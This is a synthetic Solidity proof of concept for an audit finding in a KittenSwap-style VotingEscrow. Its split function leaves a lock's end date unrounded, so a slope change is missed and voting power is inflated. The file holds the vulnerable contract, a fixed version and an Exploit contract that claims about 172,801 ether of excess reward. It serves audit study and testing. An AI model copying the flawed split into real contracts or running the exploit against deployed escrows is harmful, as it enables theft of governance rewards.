// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

/*  KittenSwap VotingEscrow.split (Pashov H-07, #58158).
    SYNTHETIC, cheatcode-free.
    create_lock rounds the unlock to the week. split sets
    end = block.timestamp + MAXTIME and does not round.
    The checkpoint only reads slopeChanges on week boundaries, so the
    unrounded expiry is never applied and the global slope stays up.
    At timestamp 1, MAXTIME = 2 * 365 days and WEEK = 7 days:
      rounded end  = 62899200, power = 62899199 ether
      split end    = 63072001, power = 63072000 ether
    The same deposit therefore claims 172801 ether more reward.
    After both locks are past due, one slope of 1 ether is still booked. */

uint256 constant LOCK_AMOUNT = 63_072_000 ether;

contract Token {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) internal _bal;
    mapping(address => mapping(address => uint256)) internal _allow;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _bal[account];
    }

    function mint(address to, uint256 amount) external {
        _bal[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _allow[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = _allow[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) _allow[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(_bal[from] >= amount, "bal");
        _bal[from] -= amount;
        _bal[to] += amount;
    }
}

contract VotingEscrow {
    struct LockedBalance {
        int128 amount;
        uint256 end;
    }

    uint256 public constant WEEK = 7 days;
    uint256 public constant MAXTIME = 2 * 365 days;

    Token public immutable token;
    uint256 public nextId = 1;
    int128 public globalSlope;
    int128 public residualSlope;
    int128 public lastSlopeDelta;
    uint256 public rawEnd;
    uint256 public roundedEnd;
    uint256 public slopeReads;

    mapping(uint256 => LockedBalance) internal _locked;
    mapping(uint256 => address) internal _owner;
    mapping(uint256 => int128) internal _slope;
    mapping(uint256 => int128) internal slopeChanges;

    constructor(Token _token) {
        token = _token;
    }

    function locked(uint256 id) external view returns (int128 amount, uint256 end) {
        LockedBalance memory L = _locked[id];
        return (L.amount, L.end);
    }

    function ownerOf(uint256 id) external view returns (address) {
        return _owner[id];
    }

    function scheduledChange(uint256 t) external view returns (int128) {
        return slopeChanges[t];
    }

    function create_lock(uint256 amount) external returns (uint256 id) {
        require(amount == LOCK_AMOUNT, "amount");
        token.transferFrom(msg.sender, address(this), amount);
        uint256 end = ((block.timestamp + MAXTIME) / WEEK) * WEEK;
        roundedEnd = end;
        id = _mint(msg.sender, int128(uint128(amount)), end);
    }

    function split(uint256 _from, uint256 _amount) external returns (uint256 id1, uint256 id2) {
        require(_owner[_from] == msg.sender, "owner");
        require(_amount > 0, "Zero Split");
        LockedBalance memory L = _locked[_from];
        int128 value = L.amount;
        int128 splitAmount = int128(uint128(_amount));
        require(splitAmount <= value, "amount");

        _cancel(L);
        _locked[_from] = LockedBalance(0, 0);
        _owner[_from] = address(0);
        _slope[_from] = 0;

        rawEnd = block.timestamp + MAXTIME; // @> VULN: split does not round the new end down to the week
        L.end = rawEnd;

        L.amount = value - splitAmount;
        id1 = _mint(msg.sender, L.amount, L.end);
        L.amount = splitAmount;
        id2 = _mint(msg.sender, L.amount, L.end);
    }

    function votingPower(uint256 id) public view returns (uint256) {
        if (block.timestamp >= _locked[id].end || _slope[id] <= 0) return 0;
        int128 bias = _slope[id] * int128(int256(_locked[id].end - block.timestamp));
        if (bias <= 0) return 0;
        return uint256(uint128(bias));
    }

    function slopeAt(uint256 t) external returns (int128 slope) {
        slope = globalSlope;
        uint256 cursor = (block.timestamp / WEEK) * WEEK;
        for (uint256 i = 0; i < 255; ++i) {
            cursor += WEEK;
            int128 d = 0;
            if (cursor > t) {
                cursor = t;
            } else {
                d = slopeChanges[cursor];
                lastSlopeDelta = d;
                slopeReads += 1;
            }
            slope += d;
            if (slope < 0) slope = 0;
            if (cursor == t) break;
        }
        residualSlope = slope;
    }

    function _mint(address who, int128 amount, uint256 end) internal returns (uint256 id) {
        id = nextId;
        nextId = id + 1;
        _locked[id] = LockedBalance(amount, end);
        _owner[id] = who;
        if (amount <= 0 || end <= block.timestamp) return id;
        int128 slope = amount / int128(int256(MAXTIME));
        _slope[id] = slope;
        globalSlope += slope;
        slopeChanges[end] -= slope;
    }

    function _cancel(LockedBalance memory L) internal {
        if (L.amount <= 0 || L.end <= block.timestamp) return;
        int128 slope = L.amount / int128(int256(MAXTIME));
        globalSlope -= slope;
        slopeChanges[L.end] += slope;
    }
}

contract VotingEscrowFixed {
    struct LockedBalance {
        int128 amount;
        uint256 end;
    }

    uint256 public constant WEEK = 7 days;
    uint256 public constant MAXTIME = 2 * 365 days;

    Token public immutable token;
    uint256 public nextId = 1;
    int128 public globalSlope;
    int128 public residualSlope;

    mapping(uint256 => LockedBalance) internal _locked;
    mapping(uint256 => address) internal _owner;
    mapping(uint256 => int128) internal _slope;
    mapping(uint256 => int128) internal slopeChanges;

    constructor(Token _token) {
        token = _token;
    }

    function ownerOf(uint256 id) external view returns (address) {
        return _owner[id];
    }

    function create_lock(uint256 amount) external returns (uint256 id) {
        require(amount == LOCK_AMOUNT, "amount");
        token.transferFrom(msg.sender, address(this), amount);
        uint256 end = ((block.timestamp + MAXTIME) / WEEK) * WEEK;
        id = _mint(msg.sender, int128(uint128(amount)), end);
    }

    function split(uint256 _from, uint256 _amount) external returns (uint256 id1, uint256 id2) {
        require(_owner[_from] == msg.sender, "owner");
        LockedBalance memory L = _locked[_from];
        int128 value = L.amount;
        int128 splitAmount = int128(uint128(_amount));
        require(splitAmount > 0 && splitAmount <= value, "amount");
        _cancel(L);
        _locked[_from] = LockedBalance(0, 0);
        _owner[_from] = address(0);
        _slope[_from] = 0;
        L.end = ((block.timestamp + MAXTIME) / WEEK) * WEEK;
        L.amount = value - splitAmount;
        id1 = _mint(msg.sender, L.amount, L.end);
        L.amount = splitAmount;
        id2 = _mint(msg.sender, L.amount, L.end);
    }

    function votingPower(uint256 id) public view returns (uint256) {
        if (block.timestamp >= _locked[id].end || _slope[id] <= 0) return 0;
        int128 bias = _slope[id] * int128(int256(_locked[id].end - block.timestamp));
        if (bias <= 0) return 0;
        return uint256(uint128(bias));
    }

    function slopeAt(uint256 t) external returns (int128 slope) {
        slope = globalSlope;
        uint256 cursor = (block.timestamp / WEEK) * WEEK;
        for (uint256 i = 0; i < 255; ++i) {
            cursor += WEEK;
            int128 d = 0;
            if (cursor > t) cursor = t;
            else d = slopeChanges[cursor];
            slope += d;
            if (slope < 0) slope = 0;
            if (cursor == t) break;
        }
        residualSlope = slope;
    }

    function _mint(address who, int128 amount, uint256 end) internal returns (uint256 id) {
        id = nextId;
        nextId = id + 1;
        _locked[id] = LockedBalance(amount, end);
        _owner[id] = who;
        if (amount <= 0 || end <= block.timestamp) return id;
        int128 slope = amount / int128(int256(MAXTIME));
        _slope[id] = slope;
        globalSlope += slope;
        slopeChanges[end] -= slope;
    }

    function _cancel(LockedBalance memory L) internal {
        if (L.amount <= 0 || L.end <= block.timestamp) return;
        int128 slope = L.amount / int128(int256(MAXTIME));
        globalSlope -= slope;
        slopeChanges[L.end] += slope;
    }
}

contract Governor {
    VotingEscrow public immutable ve;
    Token public immutable reward;
    uint256 public paid;

    constructor(VotingEscrow _ve, Token _reward) {
        ve = _ve;
        reward = _reward;
    }

    function claim(uint256 id, address to) external {
        require(ve.ownerOf(id) == msg.sender, "owner");
        uint256 power = ve.votingPower(id);
        paid = power;
        reward.transfer(to, power);
    }
}

contract Exploit {
    uint256 public constant FUTURE = 105 * 7 days;

    Token public lockToken;
    Token public reward;
    VotingEscrow public ve;
    Governor public gov;

    uint256 public honestId;
    uint256 public splitId;
    uint256 public fairPower;
    uint256 public inflatedPower;
    uint256 public claimed;
    int128 public residualSlope;

    constructor() {
        lockToken = new Token("Kitten Lock", "LOCK");
        reward = new Token("Reward", "REWARD");
        ve = new VotingEscrow(lockToken);
        gov = new Governor(ve, reward);
        lockToken.mint(address(this), LOCK_AMOUNT * 2);
        reward.mint(address(gov), LOCK_AMOUNT);
    }

    function run() external {
        lockToken.approve(address(ve), type(uint256).max);
        honestId = ve.create_lock(LOCK_AMOUNT);
        fairPower = ve.votingPower(honestId);
        require(fairPower == 62_899_199 ether, "fair");
        require(ve.roundedEnd() == 62_899_200, "week");

        uint256 parent = ve.create_lock(LOCK_AMOUNT);
        (, uint256 id2) = ve.split(parent, LOCK_AMOUNT);
        splitId = id2;
        inflatedPower = ve.votingPower(splitId);
        require(ve.rawEnd() == 63_072_001, "raw end");
        require(inflatedPower == 63_072_000 ether, "inflated");
        require(inflatedPower - fairPower == 172_801 ether, "excess");

        int128 stuck = ve.slopeAt(FUTURE);
        residualSlope = stuck;
        require(stuck == int128(uint128(1 ether)), "slope stuck");
        require(ve.scheduledChange(ve.rawEnd()) == -int128(uint128(1 ether)), "missed slot");

        gov.claim(splitId, msg.sender);
        claimed = gov.paid();
        require(claimed == inflatedPower, "paid power");
        require(reward.balanceOf(msg.sender) == inflatedPower, "reward");
    }
}
